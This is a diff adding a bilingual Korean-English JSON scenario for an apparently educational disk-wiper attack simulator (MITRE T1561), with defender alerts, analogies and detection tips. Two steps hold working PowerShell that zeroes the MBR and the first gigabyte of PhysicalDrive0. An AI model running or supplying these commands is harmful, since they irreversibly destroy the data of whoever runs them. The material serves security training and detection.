@@ -1,0 +1,188 @@
+{
+  "id": "T1561",
+  "title": "디스크 와이프 시뮬레이션",
+  "titleEn": "Disk Wipe Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "파괴", "labelEn": "Destroy", "icon": "💣" },
+    { "label": "확산", "labelEn": "Spread", "icon": "🕸️" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "icon": "☠️" },
+    { "id": "victim", "label": "Target Server", "icon": "🖥️" },
+    { "id": "dc", "label": "Domain Controller", "icon": "🏰" },
+    { "id": "backup", "label": "Backup Server", "icon": "💾" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "victim", "label": "Initial Wipe", "activeStep": [1, 2] },
+    { "from": "attacker", "to": "dc", "label": "DC Wipe", "activeStep": [3] },
+    { "from": "attacker", "to": "backup", "label": "Backup Destroy", "activeStep": [3] },
+    { "from": "victim", "to": "siem", "label": "Alert", "activeStep": [0, 1, 2, 3, 4] }
+  ],
+  "desktopIcons": [
+    { "name": "diskpart.exe", "icon": "💽", "alertOnStep": 1 },
+    { "name": "dd.exe", "icon": "🔧", "alertOnStep": 2 },
+    { "name": "wiper.exe", "icon": "💀", "alertOnStep": 3 },
+    { "name": "bcdedit.exe", "icon": "⚠️", "alertOnStep": 4 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Enumerate disk targets\n$disks = Get-WmiObject Win32_DiskDrive;\nforeach($d in $disks) {\n  Write-Host \\\"Disk: $($d.DeviceID)\\\";\n  Write-Host \\\"  Model: $($d.Model)\\\";\n  Write-Host \\\"  Size: $([math]::Round($d.Size/1GB,0)) GB\\\";\n  Write-Host \\\"  Partitions: $($d.Partitions)\\\";\n  Write-Host '';\n}\nWrite-Host 'Target assessment:';\nWrite-Host '  PhysicalDrive0 : OS + Data (500 GB SSD) [PRIMARY TARGET]';\nWrite-Host '  PhysicalDrive1 : Backup volume (2 TB HDD) [SECONDARY]'\"",
+      "out": "Disk: \\\\.\\PhysicalDrive0\n  Model: Samsung SSD 970 EVO 500GB\n  Size: 500 GB\n  Partitions: 3\n\nDisk: \\\\.\\PhysicalDrive1\n  Model: WD Red 2TB\n  Size: 2000 GB\n  Partitions: 1\n\nTarget assessment:\n  PhysicalDrive0 : OS + Data (500 GB SSD) [PRIMARY TARGET]\n  PhysicalDrive1 : Backup volume (2 TB HDD) [SECONDARY]",
+      "def": "[EDR] Disk enumeration via WMI — potential wiper reconnaissance",
+      "defAction": "Process: powershell.exe (PID: 3400)\nAction: WMI disk enumeration (Win32_DiskDrive)\nDisks Found: 2 (500GB SSD + 2TB HDD)\nRisk: MEDIUM\nAction: Behavior flagged for monitoring",
+      "desc": "WMI를 사용하여 시스템의 물리 디스크를 열거합니다. OS 디스크(500GB SSD)와 백업 디스크(2TB HDD)를 파괴 대상으로 식별합니다.",
+      "descEn": "Enumerates physical disks using WMI. Identifies OS disk (500GB SSD) and backup disk (2TB HDD) as destruction targets.",
+      "stepTitle": "디스크 대상 열거",
+      "stepTitleEn": "Disk Target Enumeration",
+      "feynman": "건물을 허물기 전에 설계도를 보고 어디에 기둥(핵심 디스크)이 있는지 확인하는 것과 같아요. 어떤 디스크에 OS가 있고, 어디에 백업이 있는지 파악합니다.",
+      "feynmanEn": "Like studying building blueprints before demolition to locate structural pillars (critical disks). Identifies which disk has the OS and where backups reside.",
+      "expert": "Win32_DiskDrive WMI 클래스를 통한 디스크 열거는 T1082 (System Information Discovery)에 해당합니다. 와이퍼 악성코드는 PhysicalDrive0(보통 OS 디스크)을 우선 표적으로 삼고, 추가 디스크에서 백업을 파괴합니다.",
+      "expertEn": "Disk enumeration via Win32_DiskDrive maps to T1082 (System Information Discovery). Wiper malware typically targets PhysicalDrive0 (usually OS disk) first, then destroys backups on additional disks.",
+      "defTooltip": "WMI를 통한 디스크 정보 쿼리를 Sysmon Event ID 20/21 (WmiEvent)로 모니터링하세요. 일반 사용자가 PhysicalDrive에 접근하는 것은 비정상입니다.",
+      "defTooltipEn": "Monitor disk info queries via WMI using Sysmon Event ID 20/21 (WmiEvent). Normal users accessing PhysicalDrive is abnormal.",
+      "hackerLog": {
+        "title": "디스크 대상 정찰",
+        "lines": [
+          { "text": "Get-WmiObject Win32_DiskDrive", "desc": "시스템 내 물리 디스크 열거" },
+          { "text": "PhysicalDrive0: 500GB SSD (OS + Data)", "desc": "주 대상: OS 디스크 식별" },
+          { "text": "PhysicalDrive1: 2TB HDD (Backup)", "desc": "부 대상: 백업 디스크 식별" }
+        ]
+      },
+      "terms": [
+        { "term": "PhysicalDrive", "desc": "Windows에서 물리 디스크를 직접 참조하는 디바이스 경로입니다." },
+        { "term": "WMI (Windows Management Instrumentation)", "desc": "Windows 시스템 관리를 위한 인프라로, 하드웨어 정보를 조회할 수 있습니다." },
+        { "term": "Wiper", "desc": "데이터를 복구 불가능하게 파괴하는 악성코드의 유형입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Destroy Master Boot Record (MBR)\n$disk = '\\\\\\\\.\\\\PhysicalDrive0';\n$handle = [IO.File]::Open($disk, 'Open', 'ReadWrite', 'None');\n$zeros = New-Object byte[] 512;\n$handle.Write($zeros, 0, 512);\n$handle.Flush(); $handle.Close();\n\nWrite-Host 'MBR Destruction:';\nWrite-Host '  Target: PhysicalDrive0 (sector 0)';\nWrite-Host '  Action: 512 bytes overwritten with 0x00';\nWrite-Host '  Boot code: DESTROYED';\nWrite-Host '  Partition table: DESTROYED';\nWrite-Host '  Result: System will not boot on restart'\"",
+      "out": "MBR Destruction:\n  Target: PhysicalDrive0 (sector 0)\n  Action: 512 bytes overwritten with 0x00\n  Boot code: DESTROYED\n  Partition table: DESTROYED\n  Result: System will not boot on restart",
+      "def": "[EDR] Raw disk write to PhysicalDrive0 sector 0 — MBR destruction",
+      "defAction": "Process: powershell.exe (PID: 3400)\nAction: Raw write to PhysicalDrive0 offset 0\nBytes Written: 512 (MBR size)\nContent: All zeros (0x00)\nRisk: CRITICAL\nAction: Process killed, disk access blocked",
+      "desc": "PhysicalDrive0의 MBR(첫 512 바이트)을 0x00으로 덮어씁니다. 부트 코드와 파티션 테이블이 파괴되어 재부팅 시 시스템이 시작되지 않습니다.",
+      "descEn": "Overwrites MBR (first 512 bytes) of PhysicalDrive0 with 0x00. Boot code and partition table are destroyed, preventing system startup on reboot.",
+      "stepTitle": "MBR 파괴",
+      "stepTitleEn": "MBR Destruction",
+      "feynman": "건물의 기초(MBR)를 폭파하는 것과 같아요. 건물(데이터)은 아직 서 있지만, 기초가 없으므로 들어갈 수가 없습니다. 컴퓨터가 켜져도 운영체제를 찾을 수 없게 됩니다.",
+      "feynmanEn": "Like blasting a building's foundation (MBR). The building (data) still stands, but without the foundation, you can't enter. The computer can't find its operating system even when powered on.",
+      "expert": "MBR 덮어쓰기는 T1561.002 (Disk Structure Wipe)의 핵심 기법입니다. 512바이트만 파괴해도 시스템을 부팅 불가로 만듭니다. 하지만 데이터 자체는 디스크에 남아있어 포렌식 복구가 가능합니다. Shamoon 와이퍼가 이 기법을 대표적으로 사용했습니다.",
+      "expertEn": "MBR overwrite is the core technique of T1561.002 (Disk Structure Wipe). Destroying just 512 bytes renders the system unbootable. However, data remains on disk and forensic recovery is possible. Shamoon wiper famously used this technique.",
+      "defTooltip": "\\\\.\\ PhysicalDrive에 대한 원시 쓰기(CreateFile + WriteFile API)를 EDR에서 실시간 차단하세요. MBR 보호 기능이 있는 부팅 보안 솔루션을 사용하세요.",
+      "defTooltipEn": "Block raw writes to \\\\.\\PhysicalDrive (CreateFile + WriteFile API) in real-time via EDR. Use boot security solutions with MBR protection.",
+      "hackerLog": {
+        "title": "MBR 파괴",
+        "lines": [
+          { "text": "PhysicalDrive0 sector 0 → 0x00 (512 bytes)", "desc": "MBR 영역 제로필 완료" },
+          { "text": "Boot code: DESTROYED", "desc": "부트 코드 파괴 — 부팅 불가" },
+          { "text": "Partition table: DESTROYED", "desc": "파티션 테이블 파괴 — 볼륨 접근 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "MBR (Master Boot Record)", "desc": "디스크의 첫 512바이트로, 부팅 코드와 파티션 정보를 담고 있습니다." },
+        { "term": "Sector 0", "desc": "디스크의 첫 번째 섹터로, MBR이 저장되는 위치입니다." },
+        { "term": "Zero-fill", "desc": "저장 공간을 모두 0으로 덮어쓰는 것으로, 데이터를 완전히 파괴합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Overwrite first 1GB of disk (beyond MBR - destroy file system)\n$disk = '\\\\\\\\.\\\\PhysicalDrive0';\n$handle = [IO.File]::Open($disk, 'Open', 'ReadWrite', 'None');\n$buffer = New-Object byte[] (1024*1024);  # 1MB buffer of zeros\n$totalMB = 1024; $written = 0;\nwhile($written -lt $totalMB) {\n  $handle.Write($buffer, 0, $buffer.Length);\n  $written++;\n}\n$handle.Flush(); $handle.Close();\n\nWrite-Host 'File System Destruction:';\nWrite-Host '  Target: PhysicalDrive0 (first 1 GB)';\nWrite-Host '  NTFS $MFT: DESTROYED (file metadata gone)';\nWrite-Host '  NTFS $Bitmap: DESTROYED (allocation map gone)';\nWrite-Host '  NTFS $LogFile: DESTROYED (journal gone)';\nWrite-Host '  Recovery: IMPOSSIBLE without backup'\"",
+      "out": "File System Destruction:\n  Target: PhysicalDrive0 (first 1 GB)\n  NTFS $MFT: DESTROYED (file metadata gone)\n  NTFS $Bitmap: DESTROYED (allocation map gone)\n  NTFS $LogFile: DESTROYED (journal gone)\n  Recovery: IMPOSSIBLE without backup",
+      "def": "[EDR] Massive raw disk overwrite — file system destruction in progress",
+      "defAction": "Process: powershell.exe (PID: 3400)\nAction: Sequential raw write to PhysicalDrive0\nBytes Written: 1 GB (1,073,741,824 bytes)\nContent: All zeros\nNTFS Structures: $MFT, $Bitmap, $LogFile destroyed\nRisk: CRITICAL\nAction: EMERGENCY — host isolated, incident declared",
+      "desc": "디스크의 첫 1 GB를 0으로 덮어씁니다. NTFS의 핵심 구조체($MFT, $Bitmap, $LogFile)가 파괴되어 파일 복구가 불가능해집니다.",
+      "descEn": "Overwrites the first 1 GB of disk with zeros. Core NTFS structures ($MFT, $Bitmap, $LogFile) are destroyed, making file recovery impossible.",
+      "stepTitle": "파일시스템 파괴",
+      "stepTitleEn": "File System Destruction",
+      "feynman": "도서관의 도서 목록(카탈로그)을 불태우는 것과 같아요. 책(데이터)이 선반에 있더라도 어디에 무엇이 있는지 알 수 없게 됩니다. NTFS의 $MFT가 바로 그 카탈로그입니다.",
+      "feynmanEn": "Like burning a library's catalog. Even if books (data) remain on shelves, nobody knows where anything is. NTFS's $MFT is that catalog.",
+      "expert": "NTFS $MFT(Master File Table)는 모든 파일의 위치, 이름, 속성을 저장합니다. $MFT 파괴 시 파일 시스템 구조가 완전히 사라집니다. 1 GB 덮어쓰기는 $MFT 미러($MFTMirr)까지 파괴합니다. 이 수준의 파괴 후에는 상용 데이터 복구 도구로도 의미 있는 복구가 불가능합니다.",
+      "expertEn": "NTFS $MFT (Master File Table) stores every file's location, name, and attributes. Destroying $MFT completely eliminates file system structure. 1 GB overwrite also destroys $MFTMirr. Commercial data recovery tools cannot perform meaningful recovery after this level of destruction.",
+      "defTooltip": "PhysicalDrive에 대한 연속적인 대량 쓰기를 EDR의 커널 드라이버 레벨에서 차단하세요. 일반 애플리케이션은 원시 디스크 쓰기를 수행하지 않습니다.",
+      "defTooltipEn": "Block sequential bulk writes to PhysicalDrive at EDR kernel driver level. Normal applications never perform raw disk writes.",
+      "hackerLog": {
+        "title": "NTFS 파일시스템 파괴",
+        "lines": [
+          { "text": "PhysicalDrive0: 1 GB overwritten with 0x00", "desc": "디스크 첫 1 GB를 제로필" },
+          { "text": "$MFT, $Bitmap, $LogFile: DESTROYED", "desc": "NTFS 핵심 메타데이터 파괴" },
+          { "text": "Recovery: IMPOSSIBLE", "desc": "데이터 복구 불가능" }
+        ]
+      },
+      "terms": [
+        { "term": "$MFT (Master File Table)", "desc": "NTFS에서 모든 파일의 메타데이터(이름, 위치, 크기)를 저장하는 핵심 구조입니다." },
+        { "term": "NTFS", "desc": "Windows의 기본 파일시스템으로, New Technology File System의 약자입니다." },
+        { "term": "Raw Disk Write", "desc": "파일시스템을 거치지 않고 디스크에 직접 데이터를 쓰는 저수준 작업입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Spread wiper to network targets\nWrite-Host '=== Network Wiper Propagation ===';\nWrite-Host '';\n$targets = @('dc01.corp.local','filesvr01.corp.local','backup01.corp.local');\nforeach($t in $targets) {\n  Write-Host \\\"Target: $t\\\";\n  Write-Host '  → PsExec remote execution: wiper.exe';\n  Write-Host '  → MBR: WIPED';\n  Write-Host '  → Disk: First 1 GB zeroed';\n  Write-Host '  → Status: DESTROYED';\n  Write-Host '';\n}\nWrite-Host 'Wiper propagation complete:';\nWrite-Host '  Servers destroyed: 4 (including initial target)';\nWrite-Host '  Total disk capacity wiped: 5.5 TB';\nWrite-Host '  Domain Controller: OFFLINE';\nWrite-Host '  Backup Server: OFFLINE';\nWrite-Host '  Active Directory: IRRECOVERABLE'\"",
+      "out": "=== Network Wiper Propagation ===\n\nTarget: dc01.corp.local\n  → PsExec remote execution: wiper.exe\n  → MBR: WIPED\n  → Disk: First 1 GB zeroed\n  → Status: DESTROYED\n\nTarget: filesvr01.corp.local\n  → PsExec remote execution: wiper.exe\n  → MBR: WIPED\n  → Disk: First 1 GB zeroed\n  → Status: DESTROYED\n\nTarget: backup01.corp.local\n  → PsExec remote execution: wiper.exe\n  → MBR: WIPED\n  → Disk: First 1 GB zeroed\n  → Status: DESTROYED\n\nWiper propagation complete:\n  Servers destroyed: 4 (including initial target)\n  Total disk capacity wiped: 5.5 TB\n  Domain Controller: OFFLINE\n  Backup Server: OFFLINE\n  Active Directory: IRRECOVERABLE",
+      "def": "[SIEM] Wiper propagation across network — multiple servers destroyed",
+      "defAction": "Wiper Spread:\n  dc01: MBR + FS destroyed\n  filesvr01: MBR + FS destroyed\n  backup01: MBR + FS destroyed\nTotal: 4 servers, 5.5 TB wiped\nAD Status: IRRECOVERABLE\nRisk: CRITICAL\nResponse: Full network isolation, bare-metal recovery required",
+      "desc": "PsExec으로 와이퍼를 도메인 컨트롤러, 파일 서버, 백업 서버에 전파합니다. 총 5.5 TB 디스크가 파괴됩니다.",
+      "descEn": "Propagates wiper to DC, file server, and backup server via PsExec. Total 5.5 TB of disk capacity destroyed.",
+      "stepTitle": "네트워크 확산 및 파괴",
+      "stepTitleEn": "Network Propagation & Destruction",
+      "feynman": "한 건물을 무너뜨린 후 옆 건물들도 차례로 폭파하는 것과 같아요. 도메인 컨트롤러가 파괴되면 Active Directory가 복구 불가능해지고, 백업 서버까지 파괴하면 모든 복구 수단이 사라집니다.",
+      "feynmanEn": "Like demolishing buildings one after another. Destroying the Domain Controller makes Active Directory irrecoverable, and destroying the backup server eliminates all recovery options.",
+      "expert": "PsExec을 통한 와이퍼 전파는 T1570 (Lateral Tool Transfer)과 T1021.002를 결합합니다. AD 파괴는 전사 인프라를 재구축해야 하는 최악의 시나리오입니다. NotPetya(2017)와 WhisperGate(2022)가 이 패턴을 사용했습니다. 베어메탈 복구(bare-metal recovery)에는 수 주가 소요됩니다.",
+      "expertEn": "Wiper propagation via PsExec combines T1570 (Lateral Tool Transfer) with T1021.002. AD destruction is the worst-case scenario requiring full infrastructure rebuild. NotPetya (2017) and WhisperGate (2022) used this pattern. Bare-metal recovery takes weeks.",
+      "defTooltip": "PsExec의 원격 서비스 설치를 Windows Event ID 7045 (Service Created)로 탐지하세요. 네트워크 세그멘테이션으로 핵심 서버 간 직접 통신을 차단하세요.",
+      "defTooltipEn": "Detect PsExec remote service installation via Windows Event ID 7045. Block direct communication between critical servers via network segmentation.",
+      "hackerLog": {
+        "title": "네트워크 와이퍼 전파",
+        "lines": [
+          { "text": "PsExec → dc01, filesvr01, backup01", "desc": "3개 서버에 와이퍼 원격 실행" },
+          { "text": "Total: 5.5 TB wiped", "desc": "총 5.5 TB 디스크 파괴" },
+          { "text": "Active Directory: IRRECOVERABLE", "desc": "AD 복구 불가 — 전사 인프라 마비" }
+        ]
+      },
+      "terms": [
+        { "term": "Wiper Propagation", "desc": "와이퍼 악성코드가 네트워크를 통해 다른 시스템으로 전파되는 것입니다." },
+        { "term": "Active Directory", "desc": "Windows 도메인의 핵심 인증/인가 서비스로, 파괴 시 전사 운영이 마비됩니다." },
+        { "term": "Bare-metal Recovery", "desc": "OS부터 모든 소프트웨어를 처음부터 재설치하는 완전 복구 방법입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Final destruction summary\nWrite-Host '=== DISK WIPE ATTACK COMPLETE ===';\nWrite-Host '';\nWrite-Host 'Destruction Summary:';\nWrite-Host '  MBR destroyed    : 4 servers';\nWrite-Host '  NTFS destroyed   : 4 servers (first 1GB each)';\nWrite-Host '  Total wiped      : 5.5 TB';\nWrite-Host '  AD recoverable   : NO';\nWrite-Host '  Backup available : NO (backup server wiped)';\nWrite-Host '';\nWrite-Host 'Business Impact:';\nWrite-Host '  Recovery method   : Bare-metal rebuild (2-4 weeks)';\nWrite-Host '  Data loss         : TOTAL (no viable backup)';\nWrite-Host '  Estimated cost    : $3M+ (rebuild + lost data)';\nWrite-Host '  Regulatory fines  : Additional $500K-$2M';\nWrite-Host '';\nWrite-Host 'Motivation: Destructive attack (no ransom demanded)';\nWrite-Host 'Attribution: Nation-state APT (geopolitical context)'\"",
+      "out": "=== DISK WIPE ATTACK COMPLETE ===\n\nDestruction Summary:\n  MBR destroyed    : 4 servers\n  NTFS destroyed   : 4 servers (first 1GB each)\n  Total wiped      : 5.5 TB\n  AD recoverable   : NO\n  Backup available : NO (backup server wiped)\n\nBusiness Impact:\n  Recovery method   : Bare-metal rebuild (2-4 weeks)\n  Data loss         : TOTAL (no viable backup)\n  Estimated cost    : $3M+ (rebuild + lost data)\n  Regulatory fines  : Additional $500K-$2M\n\nMotivation: Destructive attack (no ransom demanded)\nAttribution: Nation-state APT (geopolitical context)",
+      "def": "[SIEM] Complete infrastructure destruction — wiper attack lifecycle complete",
+      "defAction": "Attack Summary:\n  Servers: 4 destroyed\n  Data: 5.5 TB irrecoverable\n  AD: Destroyed\n  Backups: Destroyed\nEstimated Loss: $3M+ plus regulatory fines\nMotivation: Pure destruction (nation-state)\nResponse: Bare-metal rebuild, insurance, law enforcement",
+      "desc": "공격 전체 요약입니다. 4대 서버, 5.5 TB 데이터 완전 파괴. 백업도 파괴되어 복구 비용은 300만 달러 이상으로 추정됩니다.",
+      "descEn": "Full attack summary. 4 servers, 5.5 TB data completely destroyed. Backups also wiped. Recovery estimated at $3M+.",
+      "stepTitle": "공격 완료 요약",
+      "stepTitleEn": "Attack Complete Summary",
+      "feynman": "도시 전체의 인프라(전기, 수도, 도로)를 한꺼번에 파괴한 것과 같아요. 랜섬웨어와 달리 돈을 요구하지 않습니다. 순수하게 상대를 무력화시키는 것이 목적인 사이버 무기입니다.",
+      "feynmanEn": "Like destroying an entire city's infrastructure (electricity, water, roads) simultaneously. Unlike ransomware, no money is demanded. It's a cyber weapon designed purely to neutralize the target.",
+      "expert": "순수 파괴 목적의 와이퍼는 보통 국가 지원 APT의 사이버전 무기입니다. Shamoon(사우디 아람코, 2012), NotPetya(우크라이나, 2017), WhisperGate(우크라이나, 2022)가 대표적입니다. 오프라인(air-gapped) 백업만이 유일한 방어 수단이며, 3-2-1-1(1개 불변 백업 추가) 전략이 권장됩니다.",
+      "expertEn": "Pure destructive wipers are typically nation-state APT cyber weapons. Notable examples: Shamoon (Saudi Aramco, 2012), NotPetya (Ukraine, 2017), WhisperGate (Ukraine, 2022). Air-gapped backups are the only defense, with 3-2-1-1 strategy (adding 1 immutable backup) recommended.",
+      "defTooltip": "오프라인(air-gapped) 백업을 최소 주 1회 수행하세요. 불변(immutable) 스토리지를 사용하면 공격자가 백업을 삭제하거나 덮어쓸 수 없습니다.",
+      "defTooltipEn": "Perform air-gapped backups at least weekly. Using immutable storage prevents attackers from deleting or overwriting backups.",
+      "hackerLog": {
+        "title": "디스크 와이프 공격 완료",
+        "lines": [
+          { "text": "4 servers / 5.5 TB wiped", "desc": "4대 서버, 총 5.5 TB 데이터 파괴" },
+          { "text": "Recovery: $3M+ / 2-4 weeks", "desc": "복구 비용 300만 달러, 2-4주 소요" },
+          { "text": "Motivation: Pure destruction (nation-state)", "desc": "국가 지원 APT의 순수 파괴 공격" }
+        ]
+      },
+      "terms": [
+        { "term": "APT (Advanced Persistent Threat)", "desc": "특정 대상을 장기간 표적으로 삼는 고도화된 해킹 그룹입니다." },
+        { "term": "Air-gapped Backup", "desc": "네트워크에서 물리적으로 분리된 오프라인 백업입니다." },
+        { "term": "Immutable Storage", "desc": "한번 기록하면 수정이나 삭제가 불가능한 저장 장치입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 3400)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "WMI: Win32_DiskDrive (disk enumeration)", "depth": 2, "alert": true, "minStep": 0 },
+    { "name": "Raw Write: PhysicalDrive0 sector 0 (MBR)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "Raw Write: PhysicalDrive0 (1 GB zero-fill)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "psexec.exe → dc01 (wiper.exe)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "psexec.exe → filesvr01 (wiper.exe)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "psexec.exe → backup01 (wiper.exe)", "depth": 2, "alert": true, "minStep": 3 }
+  ]
+}
